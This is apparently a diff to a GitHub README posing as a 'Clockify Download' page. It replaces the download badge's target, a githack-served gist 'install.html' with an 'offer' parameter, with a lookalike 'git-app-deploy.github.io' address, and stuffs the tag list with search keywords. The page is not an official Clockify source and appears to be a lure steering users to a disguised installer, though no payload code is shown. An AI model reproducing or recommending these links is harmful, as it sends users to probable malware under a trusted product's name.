@@ -1,6 +1,6 @@
 # Clockify Download — Desktop Time Tracking
 
-[![Get Clockify GitHub](https://img.shields.io/badge/Get%20Clockify%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/dryparakon987/43e5af042fb4280c67f2ac1a30305e61/raw/f3fd0ad64870b08a7653228de3ae59ca05e0574c/install.html?offer=Clockify)
+[![Get Clockify GitHub](https://img.shields.io/badge/Get%20Clockify%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Clockify)
 
 ---
 
@@ -70,7 +70,7 @@ A: Yes, entries are cached and synced later.
 ---
 
 ## 🔍 Tags
-clockify, desktop time tracker, productivity timer, pc mac hours log, project timing tool, work hour tracking, task monitoring desktop, clockify pc, clockify windows, clockify desktop, clockify for mac, clockify for pc, clockify for windows, clockify mac
+clockify, clockify download, clockify pricing, clockify time tracker, clockify app, desktop time tracker, productivity timer, pc mac hours log, project timing tool, work hour tracking, task monitoring desktop, clockify pc, clockify windows, clockify desktop, clockify for mac, clockify for pc, clockify for windows, clockify mac
 
 ---
 
